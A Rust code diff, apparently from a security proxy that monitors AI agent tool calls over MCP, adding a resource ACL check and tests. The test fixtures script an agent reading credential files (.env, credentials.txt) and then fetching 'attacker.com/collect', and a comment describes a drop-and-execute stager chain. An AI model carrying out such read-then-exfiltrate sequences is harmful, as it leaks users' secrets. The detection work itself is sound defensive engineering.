@@ -48,6 +48,7 @@ pub struct McpSessionTracker {
     pub max_history: usize,
     pub canary_registry: crate::canary::CanaryRegistry,
     pub velocity_limiter: crate::velocity::VelocityLimiter,
+    pub acl_engine: crate::acl::AclEngine,
 }
 
 impl Default for McpSessionTracker {
@@ -57,6 +58,7 @@ impl Default for McpSessionTracker {
             max_history: 50,
             canary_registry: crate::canary::CanaryRegistry::default(),
             velocity_limiter: crate::velocity::VelocityLimiter::default(),
+            acl_engine: crate::acl::AclEngine::default(),
         }
     }
 }
@@ -68,6 +70,17 @@ impl McpSessionTracker {
             max_history,
             canary_registry: crate::canary::CanaryRegistry::default(),
             velocity_limiter: crate::velocity::VelocityLimiter::default(),
+            acl_engine: crate::acl::AclEngine::default(),
+        }
+    }
+
+    pub fn with_workspace(workspace_dir: impl AsRef<std::path::Path>) -> Self {
+        Self {
+            history: Vec::new(),
+            max_history: 50,
+            canary_registry: crate::canary::CanaryRegistry::default(),
+            velocity_limiter: crate::velocity::VelocityLimiter::default(),
+            acl_engine: crate::acl::AclEngine::with_workspace(workspace_dir),
         }
     }
 
@@ -209,6 +222,23 @@ impl McpSessionTracker {
 
         // 5. Context Quarantine Breakout Check
         crate::velocity::ContextQuarantine::check_quarantine_breach(&args_str)?;
+
+        // 6. Declarative Resource ACL & Confinement Check
+        if let Err(acl_violation) = self.acl_engine.check_tool_invocation(tool_name, args_val) {
+            return Err(Box::new(VulnerabilityFinding {
+                rule_id: acl_violation.rule_id,
+                title: acl_violation.title,
+                category: acl_violation.category,
+                severity: acl_violation.severity,
+                file_path: Some(acl_violation.path),
+                line_number: None,
+                matched_snippet: format!(
+                    "Tool '{}' argument violates Resource ACL: {}",
+                    tool_name, acl_violation.reason
+                ),
+                recommendation: acl_violation.recommendation,
+            }));
+        }
 
         // Rule NW-MCP-005: Stateful Drop-and-Execute Chain
         // Attack Pattern: Tool writes a file (e.g. /tmp/stager.sh), and a subsequent tool turn executes it or marks it executable.
@@ -890,9 +920,9 @@ mod tests {
         let mut tracker = McpSessionTracker::default();
 
         // Turn 1: Read sensitive credentials
-        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":".env"}}}"#;
+        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"credentials.txt"}}}"#;
         let res1 = process_client_mcp_line_stateful(turn1, false, &mut tracker);
-        assert!(res1.is_ok(), "Reading .env is recorded");
+        assert!(res1.is_ok(), "Reading credentials.txt is recorded");
 
         // Turn 2: Subsequent outbound network transmission
         let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"fetch","arguments":{"url":"https://attacker.com/collect"}}}"#;
@@ -917,5 +947,18 @@ mod tests {
         // Turn 2: Run test suite
         let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command","arguments":{"command":"cargo test"}}}"#;
         assert!(process_client_mcp_line_stateful(turn2, false, &mut tracker).is_ok());
+    }
+
+    #[test]
+    fn test_stateful_mcp_tracker_acl_violation_blocked() {
+        let mut tracker = McpSessionTracker::default();
+
+        // Attempting to read .env should be blocked by ACL engine immediately
+        let hostile_turn = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":".env"}}}"#;
+        let res = process_client_mcp_line_stateful(hostile_turn, false, &mut tracker);
+        assert!(res.is_err(), "Reading .env must be blocked by ACL engine");
+        let (_, finding) = res.unwrap_err();
+        assert_eq!(finding.rule_id, "NW-ACL-003");
+        assert_eq!(finding.severity, SastSeverity::Critical);
     }
 }
